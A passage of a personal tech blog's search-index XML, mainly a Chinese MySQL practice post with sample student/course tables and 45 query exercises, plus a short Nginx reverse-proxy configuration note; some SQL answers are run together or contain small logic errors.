        res += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> res</code></pre>

]]></content>
      <tags>
        <tag>古典密码</tag>
        <tag>DES</tag>
        <tag>RSA</tag>
        <tag>MD5</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL45个常用语句练习</title>
    <url>/2024/03/22/msyql45/</url>
    <content><![CDATA[<h1 id="MySQL45个常用语句练习"><a href="#MySQL45个常用语句练习" class="headerlink" title="MySQL45个常用语句练习"></a>MySQL45个常用语句练习</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="关于各种连接的解释"><a href="#关于各种连接的解释" class="headerlink" title="关于各种连接的解释"></a>关于各种连接的解释</h3><p><a href="https://blog.csdn.net/qq_36501591/article/details/116234694">https://blog.csdn.net/qq_36501591/article/details/116234694</a></p>
<h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><pre><code class="hljs mysql">create table Student(SId varchar(10),Sname varchar(10),Sage datetime,Ssex varchar(10));
insert into Student values(&#x27;01&#x27; , &#x27;赵雷&#x27; , &#x27;1990-01-01&#x27; , &#x27;男&#x27;);
insert into Student values(&#x27;02&#x27; , &#x27;钱电&#x27; , &#x27;1990-12-21&#x27; , &#x27;男&#x27;);
insert into Student values(&#x27;03&#x27; , &#x27;孙风&#x27; , &#x27;1990-05-20&#x27; , &#x27;男&#x27;);
insert into Student values(&#x27;04&#x27; , &#x27;李云&#x27; , &#x27;1990-08-06&#x27; , &#x27;男&#x27;);
insert into Student values(&#x27;05&#x27; , &#x27;周梅&#x27; , &#x27;1991-12-01&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;06&#x27; , &#x27;吴兰&#x27; , &#x27;1992-03-01&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;07&#x27; , &#x27;郑竹&#x27; , &#x27;1989-07-01&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;09&#x27; , &#x27;张三&#x27; , &#x27;2017-12-20&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;10&#x27; , &#x27;李四&#x27; , &#x27;2017-12-25&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;11&#x27; , &#x27;李四&#x27; , &#x27;2017-12-30&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;12&#x27; , &#x27;赵六&#x27; , &#x27;2017-01-01&#x27; , &#x27;女&#x27;);
insert into Student values(&#x27;13&#x27; , &#x27;孙七&#x27; , &#x27;2018-01-01&#x27; , &#x27;女&#x27;);


create table Course(CId varchar(10),Cname nvarchar(10),TId varchar(10));
insert into Course values(&#x27;01&#x27; , &#x27;语文&#x27; , &#x27;02&#x27;);
insert into Course values(&#x27;02&#x27; , &#x27;数学&#x27; , &#x27;01&#x27;);
insert into Course values(&#x27;03&#x27; , &#x27;英语&#x27; , &#x27;03&#x27;);


create table Teacher(TId varchar(10),Tname varchar(10));
insert into Teacher values(&#x27;01&#x27; , &#x27;张三&#x27;);
insert into Teacher values(&#x27;02&#x27; , &#x27;李四&#x27;);
insert into Teacher values(&#x27;03&#x27; , &#x27;王五&#x27;);

create table SC(SId varchar(10),CId varchar(10),score decimal(18,1));
insert into SC values(&#x27;01&#x27; , &#x27;01&#x27; , 80);
insert into SC values(&#x27;01&#x27; , &#x27;02&#x27; , 90);
insert into SC values(&#x27;01&#x27; , &#x27;03&#x27; , 99);
insert into SC values(&#x27;02&#x27; , &#x27;01&#x27; , 70);
insert into SC values(&#x27;02&#x27; , &#x27;02&#x27; , 60);
insert into SC values(&#x27;02&#x27; , &#x27;03&#x27; , 80);
insert into SC values(&#x27;03&#x27; , &#x27;01&#x27; , 80);
insert into SC values(&#x27;03&#x27; , &#x27;02&#x27; , 80);
insert into SC values(&#x27;03&#x27; , &#x27;03&#x27; , 80);
insert into SC values(&#x27;04&#x27; , &#x27;01&#x27; , 50);
insert into SC values(&#x27;04&#x27; , &#x27;02&#x27; , 30);
insert into SC values(&#x27;04&#x27; , &#x27;03&#x27; , 20);
insert into SC values(&#x27;05&#x27; , &#x27;01&#x27; , 76);
insert into SC values(&#x27;05&#x27; , &#x27;02&#x27; , 87);
insert into SC values(&#x27;06&#x27; , &#x27;01&#x27; , 31);
insert into SC values(&#x27;06&#x27; , &#x27;03&#x27; , 34);
insert into SC values(&#x27;07&#x27; , &#x27;02&#x27; , 89);
insert into SC values(&#x27;07&#x27; , &#x27;03&#x27; , 98);
</code></pre>

<h2 id="练习-—-45-个sql练习题"><a href="#练习-—-45-个sql练习题" class="headerlink" title="练习 — 45 个sql练习题"></a>练习 — 45 个sql练习题</h2><pre><code class="hljs mysql">-- 1.查询&quot; 01 &quot;课程比&quot; 02 &quot;课程成绩高的学生的信息及课程分数
SELECT
	s.*,
	a.score AS score_01,
	b.score AS score_02 
FROM
	student s
	JOIN sc a ON s.SId = a.SId 
	AND a.CId = &#x27;01&#x27;
	JOIN sc b ON s.SId = b.SId 
	AND b.CId = &#x27;02&#x27; 
WHERE
	a.score &gt; b.score;
SELECT
	s.*,
	a.score,
	b.score 
FROM
	student s
	LEFT JOIN ( SELECT * FROM sc WHERE CId = &#x27;01&#x27; ) a ON s.sid = a.sid
	INNER JOIN ( SELECT * FROM sc WHERE CId = &#x27;02&#x27; ) b ON a.SId = b.SId 
WHERE
	a.score &gt; b.score 

-- 1.1 查询同时存在&quot; 01 &quot;课程和&quot; 02 &quot;课程的情况
SELECT
	* 
FROM
	( SELECT * FROM sc WHERE CId = &#x27;01&#x27; ) a
	JOIN ( SELECT * FROM sc WHERE CId = &#x27;02&#x27; ) b ON a.SId = b.SId SELECT
	* 
FROM
	sc a
	JOIN sc b ON a.sid = b.sid 
	AND a.cid = &#x27;01&#x27; 
	AND b.cid = &#x27;02&#x27; 
	
-- 1.2 查询存在&quot; 01 &quot;课程但可能不存在&quot; 02 &quot;课程的情况(不存在时显示为 null )
SELECT
	* 
FROM
	( SELECT * FROM sc WHERE cid = &#x27;01&#x27; ) a
	LEFT JOIN ( SELECT * FROM sc WHERE cid = &#x27;02&#x27; ) b ON a.sid = b.sid 
-- 1.3 查询不存在&quot; 01 &quot;课程但存在&quot; 02 &quot;课程的情况
SELECT
	* 
FROM
	(
	SELECT
		* 
	FROM
		sc 
	WHERE
	sid NOT IN ( SELECT sid FROM sc WHERE cid = &#x27;01&#x27; )) a
	INNER JOIN sc b ON a.sid = b.sid 
WHERE
	b.cid = &#x27;02&#x27;;
-- 2.查询平均成绩大于等于 60 分的同学的学生编号和学生姓名和平均成绩
SELECT
	* 
FROM
	student s
	INNER JOIN ( SELECT sid, AVG( score ) AS avg_score FROM sc GROUP BY sid HAVING avg_score &gt; 60 ) c ON s.sid = c.sid 
-- 3.查询在 SC 表存在成绩的学生信息
	
	SET @@GLOBAL.sql_mode = &#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;;
SELECT
	b.* 
FROM
	sc a
	LEFT JOIN student b ON a.sid = b.sid 
GROUP BY
	b.sid 
-- 4.查询所有同学的学生编号、学生姓名、选课总数、所有课程的总成绩(没成绩的显示为 null ) 4.1 查有成绩的学生信息
SELECT
	a.sid,
	a.sname,
	b.cons,
	b.sum_score 
FROM
	student a
	LEFT JOIN ( SELECT sid, count( cid ) AS cons, sum( score ) AS sum_score FROM sc GROUP BY sid ) b ON a.sid = b.sid 
-- 5.查询「李」姓老师的数量
SELECT
	COUNT(*) 
FROM
	teacher 
WHERE
	tname LIKE &quot;李%&quot; 
-- 6.查询学过「张三」老师授课的同学的信息
SELECT
	s.* 
FROM
	student s
	JOIN sc c ON s.sid = c.sid 
WHERE
	cid = ( SELECT a.cid FROM course a JOIN teacher b ON a.tid = b.tid WHERE b.tname = &quot;张三&quot; ) SELECT
	b.* 
FROM
	sc a
	LEFT JOIN student b ON a.sid = b.sid 
WHERE
	cid IN ( SELECT cid FROM course WHERE tid =( SELECT tid FROM teacher WHERE tname = &#x27;张三&#x27; ) ) 
GROUP BY
	sid;
-- 7.查询没有学全所有课程的同学的信息
SELECT
	* 
FROM
	student a
	JOIN sc b ON a.sid = b.sid 
GROUP BY
	a.sid 
HAVING
	COUNT( b.cid ) &lt; ( SELECT COUNT(*) FROM course ) 
-- 8.查询至少有一门课与学号为&quot; 01 &quot;的同学所学相同的同学的信息
SELECT DISTINCT
	s.* 
FROM
	student s
	JOIN sc c ON s.sid = c.sid 
WHERE
	c.cid IN ( SELECT cid FROM sc WHERE sid = 1 ) SELECT DISTINCT
	b.* 
FROM
	sc a
	LEFT JOIN student b ON a.sid = b.sid 
WHERE
	cid IN ( SELECT cid FROM sc WHERE sid = &#x27;01&#x27; );
-- 9.查询和&quot; 01 &quot;号的同学学习的课程 完全相同的其他同学的信息
-- 要没有学习01号同学学习课程外的其他课程， 而且学习的课程数量相同
SELECT
	* 
FROM
	( SELECT * FROM sc WHERE cid IN ( SELECT cid FROM sc WHERE sid = &#x27;01&#x27; ) AND sid != &#x27;01&#x27; ) a
	LEFT JOIN student s ON a.sid = s.sid 
GROUP BY
	a.sid 
HAVING
	count( cid ) = ( SELECT count( 1 ) FROM sc WHERE sid = &#x27;01&#x27; ) 
-- 10.查询没学过&quot;张三&quot;老师讲授的任一门课程的学生姓名
-- 查询 张三 老师教的课程cid
-- 先查询学过 张三老师课程的学生
SELECT
	sid 
FROM
	sc a
	LEFT JOIN course c ON a.cid = c.cid
	JOIN teacher d ON c.tid = d.tid 
WHERE
	d.tname = &quot;张三&quot; SELECT
	sname 
FROM
	student 
WHERE
	sid NOT IN (
	SELECT
		sid 
	FROM
		sc a
		LEFT JOIN course c ON a.cid = c.cid
		JOIN teacher d ON c.tid = d.tid 
	WHERE
		d.tname = &quot;张三&quot; 
	)
    
-- 11.查询两门及其以上不及格课程的同学的学号，姓名及其平均成绩
SELECT
	a.sid,
	a.sname 
FROM
	student a
	JOIN ( SELECT * FROM sc WHERE score &lt; 60 GROUP BY sid HAVING count( 1 ) &gt;= 2 ) b ON a.sid = b.sid SELECT
	a.sid,
	a.sname,
	avg( b.score ) AS avg_score 
FROM
	student a
	LEFT JOIN sc b ON a.sid = b.sid 
WHERE
	b.score &lt; 60 GROUP BY a.sid HAVING count( a.sid ) &gt;= 2 
-- 12.检索&quot; 01 &quot;课程分数小于 60，按分数降序排列的学生信息
SELECT
	* 
FROM
	student a
	JOIN sc b ON a.sid = b.sid 
WHERE
	b.cid = &#x27;01&#x27; 
	AND b.score &lt; 60 
ORDER BY
	b.score DESC
-- 13.按平均成绩从高到低显示所有学生的所有课程的成绩以及平均成绩
SELECT
	c.sid,
	c.sname,
	c.cid,
	c.score,
	d.avg_score 
FROM
	(
	SELECT
		a.sid,
		a.sname,
		b.cid,
		b.score 
	FROM
		student a
		LEFT JOIN sc b ON a.sid = b.sid 
	) c
	LEFT JOIN ( SELECT sid, avg( score ) AS avg_score FROM sc GROUP BY sid ) d ON c.sid = d.sid 
ORDER BY
	d.avg_score DESC SELECT
	c.sid,
	c.cid,
	c.score,
	d.avg_sco 
FROM
	(
	SELECT
		a.sid,
		b.cid,
		b.score 
	FROM
		student a
		LEFT JOIN sc b ON a.sid = b.sid 
	) c
	LEFT JOIN ( SELECT sid, avg( a.score ) AS avg_sco FROM sc a GROUP BY a.sid ) d ON c.sid = d.sid 
ORDER BY
	avg_sco DESC;
-- 14.查询各科成绩最高分、最低分和平均分： 
-- 以如下形式显示：课程 ID，课程 name，最高分，最低分，平均分，及格率，中等率，优良率，优秀率 及格为&gt;=60，中等为：70-80，优良为：80-90，优秀为：&gt;=90 要求输出课程号和选修人数，查询结果按人数降序排列，若人数相同，按课程号升序排列
SELECT
	avg( score ) AS avg_score 
FROM
	sc 
GROUP BY
	cid SELECT
	max( score ) AS avg_score 
FROM
	sc 
GROUP BY
	cid SELECT
	min( score ) AS avg_score 
FROM
	sc 
GROUP BY
	cid SELECT
	cid,
	max( score ) AS max_score,
	min( score ) AS min_score,
	avg( score ) AS avg_score,
	count(*) AS cons,
	sum(
	IF
	( score &gt;= 60, 1, 0 )) / count( 1 ) AS jige,
	sum(
	IF
	( score &gt;= 70 AND score &lt; 80, 1, 0 )) / count( 1 ) AS zhongdeng,
	sum(
	IF
	( score &gt;= 80 AND score &lt; 90, 1, 0 )) / count( 1 ) AS youliang,
	sum(
	IF
	( score &gt;= 90, 1, 0 )) / count( 1 ) AS youxiu 
FROM
	sc 
GROUP BY
	cid DESC SELECT
	cid,
	max( score ) AS max_sc,
	min( score ) AS min_sc,
	avg( score ) AS avg_sc,
	count( 1 ) AS cons,
	sum(
	IF
	( score &gt;= 60, 1, 0 ))/ count( 1 ) AS jige,
	sum(
	IF
	( 70 &lt;= score AND score &lt;= 80, 1, 0 ))/ count( 1 ) AS zd,
	sum(
	IF
	( 80 &lt;= score AND score &lt;= 90, 1, 0 ))/ count( 1 ) AS yl,
	sum(
	IF
	( 90 &gt;= score, 1, 0 ))/ count( 1 ) AS yx 
FROM
	sc 
GROUP BY
	cid;
-- 15.按各科成绩进行排序，并显示排名， Score 重复时保留名次空缺
SELECT
	sid,
	cid,
	score,
	@rank := @rank + 1 AS rn 
FROM
	sc,(
	SELECT
		@rank := 0 
	) AS t 
ORDER BY
	score DESC;
-- 16.查询学生的总成绩，并进行排名，总分重复时保留名次空缺 16.1 查询学生的总成绩，并进行排名，总分重复时不保留名次空缺
SELECT
	s.*,
CASE
		
		WHEN @sco = scos THEN
		&#x27;&#x27; ELSE @rank := @rank + 1 
	END AS rn,
	@sco := scos 
FROM
	( SELECT sid, sum( score ) AS scos FROM sc GROUP BY sid ORDER BY scos DESC ) s,
	( SELECT @rank := 0, @sco := NULL ) AS t 
-- 17.统计各科成绩各分数段人数：课程编号，课程名称，[100-85]，[85-70]，[70-60]，[60-0] 及所占百分比
SELECT
	cid,
	max( score ) AS max_sc,
	min( score ) AS min_sc,
	avg( score ) AS avg_sc,
	sum(
	IF
	( score &gt;= 60, 1, 0 ))/ count( 1 ) AS jige,
	sum(
	IF
	( 70 &lt;= score AND score &lt;= 80, 1, 0 ))/ count( 1 ) AS zd,
	sum(
	IF
	( 80 &lt;= score AND score &lt;= 90, 1, 0 ))/ count( 1 ) AS yl,
	sum(
	IF
	( 90 &gt;= score, 1, 0 ))/ count( 1 ) AS yx 
FROM
	sc 
GROUP BY
	cid;
SELECT
	a.cid,
	b.cname,
	max( a.score ) AS max_sc,
	min( a.score ) AS min_sc,
	avg( a.score ) AS avg_sc,
	sum(
	IF
	( a.score &lt; 60, 1, 0 )) AS bjg,
	sum(
	IF
	( a.score &gt;= 60 AND a.score &lt; 70, 1, 0 )) AS jg,
	sum(
	IF
	( 70 &lt;= a.score AND a.score &lt; 85, 1, 0 )) AS zd,
	sum(
	IF
	( 85 &lt;= a.score AND a.score &lt;= 100, 1, 0 )) AS yl,
	sum(
	IF
	( a.score &lt; 60, 1, 0 )) / count( 1 ) AS bjg_p,
	sum(
	IF
	( a.score &gt;= 60 AND a.score &lt; 70, 1, 0 ))/ count( 1 ) AS jg_p,
	sum(
	IF
	( 70 &lt;= a.score AND a.score &lt; 85, 1, 0 ))/ count( 1 ) AS zd_p,
	sum(
	IF
	( 85 &lt;= a.score AND a.score &lt;= 100, 1, 0 ))/ count( 1 ) AS yl_p 
FROM
	sc a
	JOIN course b ON a.cid = b.cid 
GROUP BY
	a.cid 
-- 18.查询各科成绩前三名的记录
-- 转换思路，前三名转化为若大于此成绩的数量少于3即为前三名
SELECT
	* 
FROM
	sc a 
WHERE
	( SELECT count( 1 ) FROM sc b WHERE a.cid = b.cid AND b.score &gt; a.score ) &lt; 3 


-- 19.查询每门课程被选修的学生数
SELECT
	cid,
	count( 1 ) AS count_ 
FROM
	sc 
GROUP BY
	cid 
	
-- 20.查询出只选修两门课程的学生学号和姓名
SELECT
	b.sid,
	b.sname 
FROM
	sc a
	JOIN student b ON a.sid = b.sid 
GROUP BY
	a.sid 
HAVING
	count( 1 ) = 2 SELECT
	student.SId,
	student.Sname 
FROM
	sc,
	student 
WHERE
	student.SId = sc.SId 
GROUP BY
	sc.SId 
HAVING
	count(*)= 2 

-- 21.查询男生、女生人数
SELECT
	count( 1 ) 
FROM
	student 
GROUP BY
	ssex SELECT
	sum(
	IF
	( ssex = &quot;男&quot;, 1, 0 )) AS man,
	sum(
	IF
	( ssex = &quot;女&quot;, 1, 0 )) AS woman 
FROM
	student 
	
-- 22.查询名字中含有「风」字的学生信息
SELECT
	* 
FROM
	student 
WHERE
	sname LIKE &quot;%风%&quot; 
-- 23.查询同名同性学生名单，并统计同名人数
SELECT
	a.*,
	count(*) AS sum 
FROM
	student a
	LEFT JOIN student b ON a.sname = b.sname 
WHERE
	a.sid != b.sid 

-- 24.查询 1990 年出生的学生名单
SELECT
	* 
FROM
	student 
WHERE
	YEAR ( sage ) = &#x27;1990&#x27; 
	
-- 25.查询每门课程的平均成绩，结果按平均成绩降序排列，平均成绩相同时，按课程编号升序排列
SELECT
	cid,
	avg( score ) AS avg_score 
FROM
	sc 
GROUP BY
	cid 
ORDER BY
	avg_score DESC,
	cid 
-- 26.查询平均成绩大于等于 85 的所有学生的学号、姓名和平均成绩
SELECT
	b.sid,
	b.sname,
	avg( a.score ) AS avg_score 
FROM
	sc a
	JOIN student b ON a.sid = b.sid 
GROUP BY
	a.sid 
HAVING
	avg_score &gt;= 85 

-- 27.查询课程名称为「数学」，且分数低于 60 的学生姓名和分数
SELECT
	b.sname,
	a.score 
FROM
	sc a
	JOIN student b ON a.sid = b.sid
	JOIN course c ON a.cid = c.cid 
	AND c.cname = &quot;数学&quot; 
WHERE
	a.score &lt; 60
-- 28.查询所有学生的课程及分数情况（存在学生没成绩，没选课的情况）
SELECT
	* 
FROM
	student a
	LEFT JOIN sc b ON a.sid = b.sid 
-- 29.查询任何一门课程成绩在 70 分以上的姓名、课程名称和分数
SELECT
	* 
FROM
	student a
	LEFT JOIN sc b ON a.sid = b.sid
	JOIN course c ON b.cid = c.cid 
WHERE
	b.score &gt; 70
-- 30.查询不及格的课程
SELECT
	* 
FROM
	sc a
	JOIN course b ON a.cid = b.cid 
WHERE
	a.score &lt; 60 
GROUP BY
	b.cid 
-- 31.查询课程编号为 01 且课程成绩在 80 分以上的学生的学号和姓名
SELECT
	b.sid,
	b.sname 
FROM
	sc a
	JOIN student b ON a.sid = b.sid 
WHERE
	a.score &gt; 80 
	AND a.cid = &#x27;01&#x27; SELECT
	student.SId,
	student.Sname 
FROM
	student,
	sc 
WHERE
	sc.CId = &#x27;01&#x27; 
	AND student.SId = sc.SId 
	AND sc.score &gt; 80 
-- 32.求每门课程的学生人数
SELECT
	b.cid,
	b.cname,
	count( 1 ) AS cons 
FROM
	sc a
	JOIN course b ON a.cid = b.cid 
GROUP BY
	cid 

-- 33.假设成绩不重复，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩
SELECT
	b.*,
	c.cname,
	a.score 
FROM
	sc a
	JOIN student b ON a.sid = b.sid
	JOIN course c ON c.cid = a.cid
	JOIN teacher d ON c.tid = d.tid 
WHERE
	d.tname = &quot;张三&quot; 
ORDER BY
	a.score DESC 
	LIMIT 0,
	1
-- 34.假设成绩有重复的情况下，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩
-- 35.查询不同课程成绩相同的学生的学生编号、课程编号、学生成绩
SELECT
	* 
FROM
	sc a
	INNER JOIN sc b ON a.sid = b.sid 
	AND a.score = b.score 
	AND a.cid != b.cid 
GROUP BY
	a.sid,
	a.cid SELECT
	* 
FROM
	sc a
	INNER JOIN sc b ON a.sid = b.sid 
WHERE
	a.cid != b.cid 
	AND a.score = b.score 
GROUP BY
	a.sid,
	a.cid 

-- 36.查询每门功成绩最好的前两名
SELECT
	* 
FROM
	sc a 
WHERE
	( SELECT count( 1 ) FROM sc b WHERE a.cid = b.cid AND b.score &gt; a.score ) &lt;= 1 SELECT
	* 
FROM
	sc a 
WHERE
	( SELECT count( 1 ) FROM sc b WHERE a.cid = b.cid AND b.score &gt; a.score ) &lt;= 1; 

-- 37.统计每门课程的学生选修人数（超过 5 人的课程才统计）。
SELECT cid, count( 1 ) FROM sc GROUP BY cid HAVING count( 1 ) &gt; 5 


-- 38.检索至少选修两门课程的学生学号
SELECT
	sid 
FROM
	sc 
GROUP BY
	sid 
HAVING
	count( 1 ) &gt;= 2 

-- 39.查询选修了全部课程的学生信息
SELECT
	sid 
FROM
	sc 
GROUP BY
	sid 
HAVING
	count( 1 ) = ( SELECT count( 1 ) FROM course ) 
	
	
-- 40.查询各学生的年龄，只按年份来算
SELECT
	*,
	YEAR (
	now()) - YEAR ( sage ) AS age 
FROM
	student -- 41.按照出生日期来算，当前月日 &lt; 出生年月的月日则，年龄减一
SELECT
	*,
CASE
		
		WHEN substr( sage, 6, 5 )&lt; substr( now(), 6, 5 ) THEN
		YEAR (
		now())- YEAR ( sage ) 
		WHEN substr( sage, 6, 5 )&gt;= substr( now(), 6, 5 ) THEN
		YEAR (
		now())- YEAR ( sage ) - 1 
	END AS age 
FROM
	student;
	
-- 42.查询本周过生日的学生
SELECT
	YEARWEEK(
	CURDATE()) -- 202411
SELECT
	SUBSTR( YEARWEEK( CURDATE()), 5, 2 ) -- 11
SELECT
	*,
	substr( YEARWEEK( student.Sage ), 5, 2 ) AS birth_week,
	substr( YEARWEEK( CURDATE()), 5, 2 ) AS now_week 
FROM
	student 
WHERE
	substr( YEARWEEK( student.Sage ), 5, 2 )= substr( YEARWEEK( CURDATE()), 5, 2 );
	
-- 43.查询下周过生日的学生
SELECT
	*,
	substr( YEARWEEK( student.Sage ), 5, 2 ) AS birth_week,
	substr( YEARWEEK( CURDATE()), 5, 2 ) AS now_week 
FROM
	student 
WHERE
	substr( YEARWEEK( student.Sage ), 5, 2 )= substr( YEARWEEK( CURDATE()), 5, 2 )+ 1;

-- 44.查询本月过生日的学生
SELECT
	*,
	MONTH ( sage ) AS birth_month,
	MONTH (
	now()) AS now_month 
FROM
	student 
WHERE
	MONTH ( sage )= MONTH (
	now()) 
	
-- 45.查询下月过生日的学生
SELECT
	*,
	MONTH ( sage ) AS birth_month,
	MONTH (
	now()) AS now_month 
FROM
	student 
WHERE
	MONTH ( sage )= MONTH (
	now()) + 1</code></pre>













]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx_proxy</title>
    <url>/2024/04/07/nginx-proxy/</url>
    <content><![CDATA[<h1 id="Nginx实现代理转发"><a href="#Nginx实现代理转发" class="headerlink" title="Nginx实现代理转发"></a>Nginx实现代理转发</h1><p>面试官问了一个问题，如何使用url实现访问一个非80端口的服务，当时靠着感觉说了nginx的反向代理的实现，后面查询了实现方法，nginx确实可以实现这个功能。</p>
<p>实现也很简单，配置一个ngnix的转发功能即可</p>
<pre><code class="hljs json">server <span class="hljs-punctuation">&#123;</span>
    listen       <span class="hljs-number">80</span>;
    #charset koi8-r;
    #access_log  logs/host.access.log  main;
    location / <span class="hljs-punctuation">&#123;</span>
        proxy_pass http<span class="hljs-punctuation">:</span><span class="hljs-comment">//localhost:8099/;</span>
    <span class="hljs-punctuation">&#125;</span>
<span class="hljs-punctuation">&#125;</span></code></pre>

<h1 id="Nginx实现反向代理"><a href="#Nginx实现反向代理" class="headerlink" title="Nginx实现反向代理"></a>Nginx实现反向代理</h1><p>主要配置为<code>upstream</code>字段，其中配置了已经部署的服务器地址，默认的负载均衡规则是轮询，也可以配置为根据权重分配访问，还有IP_Hash规则。</p>
<pre><code class="hljs json">upstream myservice <span class="hljs-punctuation">&#123;</span>
    server <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">8081</span>;
    server <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">8083</span>;
    # server <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-punctuation">:</span><span class="hljs-number">8847</span>;
<span class="hljs-punctuation">&#125;</span>

server <span class="hljs-punctuation">&#123;</span>
    listen       <span class="hljs-number">80</span>;
    server_name  localhost;

    location / <span class="hljs-punctuation">&#123;</span>
    proxy_pass http<span class="hljs-punctuation">:</span><span class="hljs-comment">//myservice;</span>
<span class="hljs-punctuation">&#125;</span></code></pre>

]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
</search>
